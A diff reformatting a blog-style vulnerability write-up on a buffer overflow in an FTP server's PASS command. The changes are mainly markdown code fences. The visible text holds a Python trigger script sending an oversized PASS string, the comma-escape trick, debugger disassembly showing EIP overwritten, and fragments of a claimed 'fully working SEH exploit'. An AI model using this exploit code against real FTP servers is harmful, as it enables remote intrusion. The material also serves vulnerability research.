@@ -8,13 +8,15 @@ categories: [security, integer]
 
 Vulnerability Analysis
 ----------------------
-To trigger the vulnerability, we need to send buffer more than 3000 bytes. Vulnerable part is the "PASS" input. 
-  
+To trigger the vulnerability, we need to send buffer more than 3000 bytes. Vulnerable part is the **PASS** input. 
+```
   reqftp += "A" * 3000
   ... code cut here ...
   s.send("PASS " + reqftp + "\r\n")
-  
+```  
+
 Example trigger overflow:
+```
   import socket, sys
 
   if len(sys.argv) <= 1:
@@ -34,13 +36,15 @@ Example trigger overflow:
   s.send("PASS " + reqftp + "\r\n")
   s.recv(1024)
   s.close()
+```
 
-However, before sending the buffer to "PASS" input, we need to escaped a character by using "\x2c", example below. 
+However, before sending the buffer to **PASS** input, we need to escaped a character by using **\x2c**, example below. 
 Further info, https://www.cleo.com/support/byproduct/lexicom/usersguide/ftp_configuration.htm. 
-
+```
   reqftp = "\x2c" + "A" * 3000
-
+```
 Upon overflowing, it will stop here at this function: 
+```
 0046C18C  /$ 56             PUSH ESI
 0046C18D  |. 57             PUSH EDI
 0046C18E  |. 8B7C24 0C      MOV EDI,DWORD PTR SS:[ESP+C]
@@ -55,8 +59,10 @@ Upon overflowing, it will stop here at this function:
 0046C1A5  |. 3B0D 78A04900  CMP ECX,DWORD PTR DS:[49A078]            ;  fsfs.0049A07C
 0046C1AB  |. 75 06          JNZ SHORT fsfs.0046C1B3
 0046C1AD  |> 8378 F4 00     CMP DWORD PTR DS:[EAX-C],0    <--- EIP 
-
-Continuing the execution by pressing "Shift + F9" (Immunity Debugger) will overwrite the EIP, e.g. (Register):
+```
+Continuing the execution by pressing **Shift + F9** (Immunity Debugger) will overwrite the EIP, e.g. 
+```
+Register
 EAX 00000000
 ECX 41414141
 EDX 777771CD ntdll.777771CD
@@ -66,8 +72,10 @@ EBP 04279D38
 ESI 00000000
 EDI 00000000
 EIP 41414141
+```
 
 Proof-of-Concept (fully working SEH exploit)
+```
   # Crafted for fun and polishing skillz!
   import sys, socket, struct
 
@@ -127,6 +135,6 @@ Proof-of-Concept (fully working SEH exploit)
   s.send("PASS " + reqftp + "\r\n")
   s.recv(1024)
   s.close()
-  
+```
   
 **This type of exploit can be crafted within hour**
